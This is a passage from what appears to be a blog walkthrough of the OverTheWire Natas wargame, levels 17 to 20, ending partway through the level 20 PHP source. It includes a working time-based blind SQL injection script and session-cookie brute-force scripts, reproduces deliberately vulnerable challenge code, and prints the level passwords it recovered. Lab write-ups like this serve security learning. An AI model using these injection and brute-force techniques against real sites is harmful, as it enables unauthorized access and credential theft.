<p>We know the database is vulnerable, but nothing is displayed to the screen, because the <em>echo</em> statements are commented out. So we&rsquo;re going in blind! To determine if the database returns True or False to our query, we can use time-based SQL injection, by making the database load longer if our query is true, and normal if not. I tested it with this injection string: <code>natas18" AND SLEEP(5)&mdash; </code>. As expected, since the user natas18 exists, the page took 5 seconds to load. When the username didn&rsquo;t exist, it loaded instantly. So the sleep function is executed if the previous part of the query was true, but not if it&rsquo;s false. With this in mind, I modified the Python script I used before:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'><span class="n">passwd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">testchars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">testchars</span><span class="p">):</span>
</span><span class='line'>    <span class="n">query</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="s">&#39;natas18&quot; and password like binary &#39;</span> <span class="o">+</span> <span class="s">&#39;&quot;&#39;</span> <span class="o">+</span> <span class="n">passwd</span> <span class="o">+</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">+</span> <span class="s">&#39;%&quot; &#39;</span> <span class="o">+</span> <span class="s">&#39;and sleep(15)-- &#39;</span><span class="p">,</span> <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Check existence&#39;</span><span class="p">}</span>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://natas17.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas17&#39;</span><span class="p">,</span> <span class="s">&#39;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&#39;</span><span class="p">),</span>\
</span><span class='line'>                          <span class="n">params</span> <span class="o">=</span> <span class="n">query</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span> <span class="c"># how many seconds to wait for a response</span>
</span><span class='line'>    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span><span class='line'>        <span class="n">passwd</span> <span class="o">+=</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Password: &#39;</span><span class="p">,</span> <span class="n">passwd</span>
</span><span class='line'>        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Done! Password is &#39;</span><span class="p">,</span> <span class="n">passwd</span>
</span></code></pre></td></tr></table></div></figure>


<p>This took long because I had to use higher values for sleep() and timeout..the script kept stopping early with shorter times. Anyway, skipping the build-up output, the passwod is <code>xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</code></p>

<h3>Level 18</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas18.png" title="natas18" alt="natas 18"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$maxid</span> <span class="o">=</span> <span class="mi">640</span><span class="p">;</span> <span class="c1">// 640 should be enough for everyone</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">isValidAdminLogin</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="cm">/* This method of authentication appears to be unsafe and has been disabled for now. */</span>
</span><span class='line'>        <span class="c1">//return 1;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">isValidID</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">createID</span><span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">global</span> <span class="nv">$maxid</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$maxid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;DEBUG: </span><span class="si">$msg</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">my_session_start</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="k">and</span> <span class="nx">isValidID</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">session_start</span><span class="p">())</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session start failed&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session start ok&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session was old: admin flag set&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// backwards compatible, secure</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas19</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nv">$showform</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">my_session_start</span><span class="p">())</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>    <span class="nv">$showform</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">session_id</span><span class="p">(</span><span class="nx">createID</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]));</span>
</span><span class='line'>    <span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">isValidAdminLogin</span><span class="p">();</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;New session started&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$showform</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>    <span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>This is a lot of code, but first let&rsquo;s see its behavior. When you enter something in the form, a random PHPSESSID between 1 and 640 is created. Then you see the message that you are logged in as a regular user. If you turn debug on and try tampering with the cookie, you will see the message that the session was old and the admin flag was set. The objective appears to be to log in with an admin session ID, and then the credentials for the next level will be printed to the screen. The first time I looked over the code and noticed the fact that the $maxid can be predicted and bruteforced, I thought that&rsquo;s the way to go, but first to understand the code:</p>

<ul>
<li><p>the $maxid holds the maximum value of a PHPSESSID &ndash;> 640</p></li>
<li><p>isValidAdminLogin() just returns 0, so whenever it&rsquo;s called it will set the admin session ID to 0 (not what we want)</p></li>
<li><p>isValidID($id) returns True if the ID is a valid number or numeric string, False otherwise</p></li>
<li><p>createID($user) this is the function that creates the PHPSESSID, with a random value between 1 and 640 (predictable and not long to bruteforce, not what we want in a session ID)</p></li>
<li><p>debug($msg) this just prints messages such as session started, etc.</p></li>
<li><p>my_session_start() this starts a session if there is a valid PHPSESSID cookie, and sets the admin session ID to 0 if it doesn&rsquo;t exist in the $_SESSION array</p></li>
<li><p>print_credentials() prints the password we&rsquo;re after if there is an admin session ID that&rsquo;s set to 1 in the $_SESSION array. Otherwise it just prints a regular message</p></li>
</ul>


<p>Well, the main vulnerabilities are the predictable session ID and the fact that the session starts based on the existence and validity of a cookie, which we can freely control. Since we need to be admin for the next level, we have to bruteforce the session cookies until we hit upon the one with the admin flag set to 1. Python to the rescue again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">success</span> <span class="o">=</span> <span class="s">&#39;You are an admin&#39;</span>
</span><span class='line'><span class="n">session_id</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">session_id</span> <span class="o">&lt;</span> <span class="mi">640</span><span class="p">:</span>
</span><span class='line'>    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)}</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Trying with session ID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;http://natas18.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas18&#39;</span><span class="p">,</span> <span class="s">&#39;xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP&#39;</span><span class="p">),</span> \
</span><span class='line'>                          <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">success</span> <span class="ow">in</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Admin session ID was: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="n">session_id</span> <span class="o">+=</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran it and it discovered the admin session ID was 46. Password for the next level is <code>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</code></p>

<h3>Level 19</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas19.png" title="natas19" alt="natas 19"></p>

<p>We don&rsquo;t have source code this time and apparently the session IDs aren&rsquo;t sequential anymore..Let&rsquo;s see. I logged in with some dummy values and noticed the PHPSESSID cookie is hex encoded now. Decoding it..surprise! It looked like this: <code>512-admin</code>. <em>admin</em> was what I put in the username field. I tried more bogus values for username and password and noticed that the session ID cookie is always constructed like this: <code><em>random number-username</em></code>. So again, brute forcing to the rescue! Since I didn&rsquo;t know how much of the code from the previous challenge has changed, I assumed the max session ID value remained the same:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">success</span> <span class="o">=</span> <span class="s">&#39;You are an admin&#39;</span>
</span><span class='line'><span class="n">session_id</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">session_id</span> <span class="o">&lt;</span> <span class="mi">640</span><span class="p">:</span>
</span><span class='line'>    <span class="n">pattern</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;-admin&#39;</span>
</span><span class='line'>    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">pattern</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)}</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Trying with session ID: &#39;</span> <span class="o">+</span> <span class="n">pattern</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;http://natas19.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas19&#39;</span><span class="p">,</span> <span class="s">&#39;4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs&#39;</span><span class="p">),</span> \
</span><span class='line'>                          <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">success</span> <span class="ow">in</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Admin session ID was: &#39;</span> <span class="o">+</span> <span class="n">pattern</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">cookie</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="n">session_id</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>


<p>And after a while I hit the jackpot with a sessiod ID of <em>381-admin</em>. The password for the next level is <code>eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</code></p>

<h3>Level 20</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas20.png" title="natas20" alt="natas 20"></p>

<p>Code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">debug</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;DEBUG: </span><span class="si">$msg</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas21</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">myopen</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYOPEN $path $name&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">myclose</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYCLOSE&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">myread</span><span class="p">(</span><span class="nv">$sid</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;MYREAD </span><span class="si">$sid</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">strspn</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="s2">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$sid</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Invalid SID&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="s2">&quot;mysess_&quot;</span> <span class="o">.</span> <span class="nv">$sid</span><span class="p">;</span>
